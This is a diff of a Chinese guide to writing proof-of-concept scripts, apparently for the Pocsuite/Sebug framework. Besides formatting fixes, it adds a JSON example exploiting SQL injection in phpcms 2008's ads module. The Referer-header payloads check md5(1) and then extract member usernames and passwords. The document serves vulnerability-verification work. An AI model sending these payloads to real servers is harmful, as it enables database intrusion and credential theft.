@@ -13,7 +13,7 @@ POC编写说明文档
 
 *   [概述](#overview)
 *   [PoC python 脚本编写步骤](#pocpy)
-*   [PoC json 脚本编写步骤](#json)
+*   [PoC json 脚本编写步骤](#pocjson)
 *   [PoC 代码示例](#pocexample)
     *   [PoC py代码示例](#pyexample)
     *   [PoC json 代码示例](#jsonexample)
@@ -371,47 +371,43 @@ register(TestPOC)
 ```
 
 <h3 id="jsonexample">PoC json代码示例</h3>
+[phpcms_2008_/ads/include/ads_place.class.php_sql注入漏洞](http://www.sebug.net/vuldb/ssvid-62274) PoC:
+
+由于json不支持注释,所以具体字段意义请参考上文，涉及到的靶场请自行根据Sebug漏洞详情搭建。
+
 ```
 {
     "pocInfo": {
-        "vulID": "poc-2015-0107",
-        "name": "Openssl 1.0.1 内存读取 信息泄露漏洞",
+        "vulID": "62274",
+        "version":"1",
+        "vulDate":"2011-11-21",
+        "createDate":"2015-09-15",
+        "updateDate":"2015-09-15",
+        "name": "phpcms_2008_ads_place.class.php_sql-inj",
         "protocol": "http",
-        "author": "test",
-        "references": ["http://drops.wooyun.org/papers/1381"],
-        "appName": "OpenSSL",
-        "appVersion" : "1.0.1~1.0.1f, 1.0.2-beta, 1.0.2-beta1",
-        "vulType": "Information Disclosure",
-        "desc" :"OpenSSL是一个强大的安全套接字层密码库。这次漏洞被称为OpenSSL“心脏出血”漏洞，这是关于 OpenSSL 的信息泄漏漏洞导致的安全问题。它使攻击者能够从内存中读取最多64 KB的数据。安全人员表示：无需任何特权信息或身份验证，我们就可以从我们自己的（测试机上）偷来X.509证书的私钥、用户名与密码、聊天工具的消息、电子邮件以及重要的商业文档和通信等数据.",
-        "samples": ["http://www.baidu.com", "http://www.qq.com"]
+        "vulType": "SQL Injection",
+        "author": "Medici.Yan",
+        "references": ["http://www.sebug.net/vuldb/ssvid-62274"],
+        "appName": "phpcms",
+        "appVersion" : "2008",
+        "appPowerLink":"http://www.phpcms.cn",
+        "desc" :"phpcms 2008 中广告模块，存在参数过滤不严，导致了sql注入漏洞，如果对方服务器开启了错误显示，可直接利用，如果关闭了错误显示，可以采用基于时间和错误的盲注",
+        "samples": ["http://127.0.0.1"]
     },
 
     "pocExecute":{
         "verify": [
             {
-                "step": "1",
+                "step": "0",
                 "method": "get",
-                "vulPath": "/api.php",
-                "params": "test=123&shit=1234",
+                "vulPath": "/data/js.php",
+                "params": "id=1",
                 "necessary": "",
-                "headers": {"cookie": "123"},
-                "status":"300",
+                "headers": {"Referer":"1', (SELECT 1 FROM (select count(*),concat(floor(rand(0)*2),char(45,45,45),(SELECT md5(1)))a from information_schema.tables group by a)b), '0')#"},
+                "status": "200",
                 "match": {
-                    "regex": ["baidu"],
-                    "time": "time"
-                }
-            },
-            {
-                "step": "2",
-                "method": "get",
-                "vulPath": "/api.php",
-                "params": "test=sebug",
-                "necessary": "",
-                "headers": "",
-                "status":"200",
-                "match":{
-                    "regex": [],
-                    "time": "0.01"
+                    "regex": ["c4ca4238a0b923820dcc509a6f75849b"],
+                    "time":""
                 }
             }
         ],
@@ -419,19 +415,20 @@ register(TestPOC)
             {
                 "step": "0",
                 "method": "get",
-                "vulPath": "/api.php",
-                "params": "test=attack",
+                "vulPath": "/data/js.php",
+                "params": "id=1",
                 "necessary": "",
-                "headers": "",
-                "status":"300",
+                "headers": {"Referer":"1', (SELECT 1 FROM (select count(*),concat(floor(rand(0)*2),char(45,45),(SELECT concat(username,char(45,45,45),password,char(45,45)) from phpcms_member limit 1))a from information_schema.tables group by a)b), '0')#"},
+                "status":"200",                
                 "match":{
-                    "regex": [],
+                    "regex": ["Duplicate"],
                     "time": ""
                 },
-                "result“:{
-                  "AdminInfo":{
-                    "Password": "<regex>www(.+)com"
-                  }
+                "result":{
+                    "AdminInfo":{
+                        "Username":"<regex>--(.+)---",
+                        "Password": "<regex>---(.+)--"
+                    }
                 }
             }
         ]
@@ -444,12 +441,12 @@ register(TestPOC)
 
 <h3 id="namedstandard">PoC 命名规范</h3>
 
-    PoC 命名分成3个部分组成漏洞应用名_版本号_漏洞类型名称 然后把文件名种的所有字母改成成小写,所有的符号改成_.
-    文件名不能有特殊字符和大写字母 最后出来的文件名应该像这样 
-    ```
-    _1847_seeyon_3_1_login_info_disclosure.py
-    ```
+PoC 命名分成3个部分组成漏洞应用名_版本号_漏洞类型名称 然后把文件名种的所有字母改成成小写,所有的符号改成_.
+文件名不能有特殊字符和大写字母 最后出来的文件名应该像这样 
 
+```
+    _1847_seeyon_3_1_login_info_disclosure.py
+```
 
 <h3 id="resultstandard">Result 说明</h3>
 
